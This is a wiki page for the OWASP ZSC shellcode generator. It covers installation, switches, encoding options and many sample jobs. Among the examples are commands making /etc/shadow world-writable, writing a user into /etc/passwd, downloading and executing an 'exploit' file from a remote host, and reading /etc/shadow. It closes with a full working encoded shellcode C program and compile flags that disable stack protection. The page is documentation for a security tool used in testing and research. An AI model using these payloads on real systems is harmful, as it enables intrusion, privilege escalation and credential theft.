---
layout: page
title: "Wiki"
#date: 2015-07-26 10:31
comments: false
sharing: true
footer: true
---
<h2>Installation</h2>
Go to download page, and download last version in github. Extract and run installer.py, then you are able to run software with <strong>OWASP ZSC</strong> command or you can directly execute <strong>zsc.py</strong> without installing it.or you can follow these commands to install the last version:
```bash 
wget https://github.com/Ali-Razmjoo/OWASP-ZSC/archive/master.zip -O owasp-zsc.zip && unzip owasp-zsc.zip && rm -rf owasp-zsc.zip && mv OWASP-ZSC-master owasp-zsc && cd owasp-zsc && python installer.py
```
<center>{% img http://zsc.z3r0d4y.com/images/Snapshot_2015-07-27_114843.png %}</center>
<br><strong>Note</strong>: Software could be <strong>uninstall</strong> with executing <strong>uninstaller.py</strong>
<br><strong>Note</strong>: Software installation directory is "<strong>/usr/share/owasp-zsc</strong>"
<br>
<h2>How to generate shellcode with OWASP ZSC?</h2>
At first look the help menu.
```
Switches:
-h, --h, -help, --help => to see this help guide  
-os => choose your os to create shellcode
-oslist	=> list os for switch -os
-o => output filename
-job => what shellcode gonna do for you ?
-joblist => list of -job switch
-encode => generate shellcode with encode
-types => types of encode for -encode switch
-wizard => wizard mod

-update => check for update
-about => about software and developers.
```
<br>With these switch you can see the oslist,encode types and functions [joblist] to generate your shellcode.<br>
<br>OS List "<strong>-oslist</strong>"
```
[+] linux_x86
[+] linux_x64
[+] linux_arm
[+] linux_mips
[+] freebsd_x86
[+] freebsd_x64
[+] windows_x86
[+] windows_x64
[+] osx
[+] solaris_x86
[+] solaris_x64
```
Encode Types "<strong>-types</strong>"
```
[+] none
[+] xor_random
[+] xor_yourvalue
[+] add_random
[+] add_yourvalue
[+] sub_random
[+] sub_yourvalue
[+] inc
[+] inc_timesyouwant
[+] dec
[+] dec_timesyouwant
[+] mix_all
```
Functions "<strong>-joblist</strong>"
```
[+] exec('/path/file')
[+] chmod('/path/file','permission number')
[+] write('/path/file','text to write')
[+] file_create('/path/file','text to write')
[+] dir_create('/path/folder')
[+] download('url','filename')
[+] download_execute('url','filename','command to execute')
[+] system('command to execute')
[+] script_executor('name of script','path and name of your script in your pc','execute command')
```
Now you are able to choose your operation system, function, and encode to generate your shellcode, But all of these features are not activated yet, so you have to <strong>look up</strong> this table <a href="http://zsc.z3r0d4y.com/table.html">HERE</a> to see what features are activated.
<center>{% img http://zsc.z3r0d4y.com/images/Snapshot_2015-07-27_123106.png %}</center>
<br>For example, this part of table telling us all functions for linux_x86 is activated, But <strong>Encodes</strong> [xor_random, xor_yourvalue, add_random, add_yourvalue, sub_random, sub_yourvalue, inc, inc_timesyouwant, dec, dec_timesyouwant] are just activated for <strong>chmod()</strong> function.<br>
<h4>Examples:</h4>
```
>zsc -os linux_x86 -encode inc -job "chmod('/etc/passwd','777')" -o file
>zsc -os linux_x86 -encode dec -job "chmod('/etc/passwd','777')" -o file
>zsc -os linux_x86 -encode inc_10 -job "chmod('/etc/passwd','777')" -o file
>zsc -os linux_x86 -encode dec_30 -job "chmod('/etc/passwd','777')" -o file
>zsc -os linux_x86 -encode xor_random -job "chmod('/etc/shadow','777')" -o file.txt
>zsc -os linux_x86 -encode xor_random -job "chmod('/etc/passwd','444')" -o file.txt
>zsc -os linux_x86 -encode xor_0x41414141 -job "chmod('/etc/shadow','777')" -o file.txt
>zsc -os linux_x86 -encode xor_0x45872f4d -job "chmod('/etc/passwd','444')" -o file.txt
>zsc -os linux_x86 -encode add_random -job "chmod('/etc/passwd','444')" -o file.txt
>zsc -os linux_x86 -encode add_0x41414141 -job "chmod('/etc/passwd','777')" -o file.txt
>zsc -os linux_x86 -encode sub_random -job "chmod('/etc/passwd','777')" -o file.txt
>zsc -os linux_x86 -encode sub_0x41414141 -job "chmod('/etc/passwd','444')" -o file.txt
>zsc -os linux_x86 -encode none -job "file_create('/root/Desktop/hello.txt','hello')" -o file.txt
>zsc -os linux_x86 -encode none -job "file_create('/root/Desktop/hello2.txt','hello[space]world[space]!')" -o file.txt
>zsc -os linux_x86 -encode none -job "dir_create('/root/Desktop/mydirectory')" -o file.txt
>zsc -os linux_x86 -encode none -job "download('http://www.z3r0d4y.com/exploit.type','myfile.type')" -o file.txt
>zsc -os linux_x86 -encode none -job "download_execute('http://www.z3r0d4y.com/exploit.type','myfile.type','./myfile.type')" -o file.txt
#multi command
>zsc -os linux_x86 -encode none -job "download_execute('http://www.z3r0d4y.com/exploit.type','myfile.type','chmod[space]777[space]myfile.type;sh[space]myfile.type')" -o file.txt
>zsc -os linux_x86 -encode none -job "script_executor('script.type','D:\\myfile.type','./script.type')" -o file.txt
>zsc -os linux_x86 -encode none -job "script_executor('z3r0d4y.sh','/root/z3r0d4y.sh','sh[space]z3r0d4y.sh')" -o file.txt
>zsc -os linux_x86 -encode none -job "script_executor('ali.py','/root/Desktop/0day.py','chmod[space]+x[space]ali.py;[space]python[space]ali.py')" -o file.txt
>zsc -os linux_x86 -encode none -job "system('ls')" -o file.txt
>zsc -os linux_x86 -encode none -job "system('ls[space]-la')" -o file.txt
>zsc -os linux_x86 -encode none -job "system('ls[space]-la[space]/etc/shadow;chmod[space]777[space]/etc/shadow;ls[space]-la[space]/etc/shadow;cat[space]/etc/shadow;wget[space]file[space];chmod[space]777[space]file;./file')" -o file.txt
>zsc -os linux_x86 -encode none -job "system('wget[space]file;sh[space]file')" -o file.txt
>zsc -os linux_x86 -encode none -job "chmod('/etc/shadow','777')" -o file.txt
>zsc -os linux_x86 -encode none -job "write('/etc/passwd','user:pass')" -o file.txt
>zsc -os linux_x86 -encode none -job "exec('/bin/bash')" -o file.txt
```
<br><strong>Note</strong>: Don't use space ' ' in system() function, replace it with "[space]" , software will detect and replace " " for you in shellcode.
<br><strong>Note</strong>: script_executor(),download_execute(),download(),dir_create(),file_create() are using linux command line , not the function. [wget,mkdir,echo]
system() function added in script, you can use it to do anything and generate any command line shellcode.
<br><strong>Note</strong>: exec() doesn't support any ARGV same as exec('/bin/bash -c ls') or exec('/bin/bash','-c','ls'), you have to wait for next version and this feature will available  in system()
<br><strong>Note</strong>: you also can use high value for inc and dec time, like inc_100000, your shellcode may get too big 
<br><strong>Note</strong>: each time you execute chmod()[or any other] function with random encode, you are gonna get random outputs and different shellcode.
<br><strong>Note</strong>: your xor value could be anything. "xor_0x41414141" and "xor_0x45872f4d" are examples.
<h4>Executing a sample:</h4>
Execute:
```
zsc -os linux_x86 -encode inc_5 -job "chmod('/etc/passwd','777')" -o shellcode.c
```
Result:<br>
<center>{% img http://zsc.z3r0d4y.com/images/Snapshot_2015-07-27_131054.png %}</center>
<br>
Code result: <strong>shellcode.c</strong>
```C shellcode.c

#include <stdio.h>
#include <string.h>
/*
This shellcode generated by ZCR Shellcoder [zsc] http://zsc.z3r0d4y.com/
Title: chmod('/etc/passwd','777')
OS: linux_x86
Encode: inc_5

shellcode.c:     file format elf32-i386

Disassembly of section .text:
00000000 <.text>:
   0:	6a 0a                	push   $0xa
   2:	58                   	pop    %eax
   3:	40                   	inc    %eax
   4:	40                   	inc    %eax
   5:	40                   	inc    %eax
   6:	40                   	inc    %eax
   7:	40                   	inc    %eax
   8:	50                   	push   %eax
   9:	58                   	pop    %eax
   a:	68 8b 90 ff 01       	push   $0x1ff908b
   f:	5b                   	pop    %ebx
  10:	43                   	inc    %ebx
  11:	43                   	inc    %ebx
  12:	43                   	inc    %ebx
  13:	43                   	inc    %ebx
  14:	43                   	inc    %ebx
  15:	53                   	push   %ebx
  16:	59                   	pop    %ecx
  17:	c1 e9 10             	shr    $0x10,%ecx
  1a:	68 8b 73 77 64       	push   $0x6477738b
  1f:	5b                   	pop    %ebx
  20:	43                   	inc    %ebx
  21:	43                   	inc    %ebx
  22:	43                   	inc    %ebx
  23:	43                   	inc    %ebx
  24:	43                   	inc    %ebx
  25:	53                   	push   %ebx
  26:	5b                   	pop    %ebx
  27:	c1 eb 08             	shr    $0x8,%ebx
  2a:	53                   	push   %ebx
  2b:	68 2a 70 61 73       	push   $0x7361702a
  30:	5b                   	pop    %ebx
  31:	43                   	inc    %ebx
  32:	43                   	inc    %ebx
  33:	43                   	inc    %ebx
  34:	43                   	inc    %ebx
  35:	43                   	inc    %ebx
  36:	53                   	push   %ebx
  37:	68 2a 65 74 63       	push   $0x6374652a
  3c:	5b                   	pop    %ebx
  3d:	43                   	inc    %ebx
  3e:	43                   	inc    %ebx
  3f:	43                   	inc    %ebx
  40:	43                   	inc    %ebx
  41:	43                   	inc    %ebx
  42:	53                   	push   %ebx
  43:	89 e3                	mov    %esp,%ebx
  45:	cd 80                	int    $0x80
  47:	b0 01                	mov    $0x1,%al
  49:	b3 01                	mov    $0x1,%bl
  4b:	cd 80                	int    $0x80



compile example: gcc -ggdb -static -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -o shellcode shellcode.c
*/
 
int main(){
unsigned char shellcode[]= "\x6a\x0a\x58\x40\x40\x40\x40\x40\x50\x58\x68\x8b\x90\xff\x01\x5b\x43\x43\x43\x43\x43\x53\x59\xc1\xe9\x10\x68\x8b\x73\x77\x64\x5b\x43\x43\x43\x43\x43\x53\x5b\xc1\xeb\x08\x53\x68\x2a\x70\x61\x73\x5b\x43\x43\x43\x43\x43\x53\x68\x2a\x65\x74\x63\x5b\x43\x43\x43\x43\x43\x53\x89\xe3\xcd\x80\xb0\x01\xb3\x01\xcd\x80";
fprintf(stdout,"Length: %d\n\n",strlen(shellcode));
    (*(void(*)()) shellcode)();
}
```
As you can see in output code "<strong>shellcode.c</strong>" you are able to compile and test shellcode with this command:
```
gcc -ggdb -static -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -o shellcode shellcode.c
```
result:
<center>{% img http://zsc.z3r0d4y.com/images/Snapshot_2015-07-27_132048.png %}</center>
<br><h3>Wizard Switch</h3>
With <strong>-wizard</strong> switch you are able to generate shellcode without long ARGVs, software will ask you for information.
<center>{% img http://zsc.z3r0d4y.com/images/Snapshot_2015-07-27_132639.png %}</center>
<br><strong>Note</strong>: While you are using <strong>-wizard</strong> switch, if you push "<strong>Enter</strong>" without typing anything, the default value will be set on the varible.
<br><strong>Note</strong>: With entering "<strong>list</strong>", List of values will be shown.
<br><br><br><br><br>
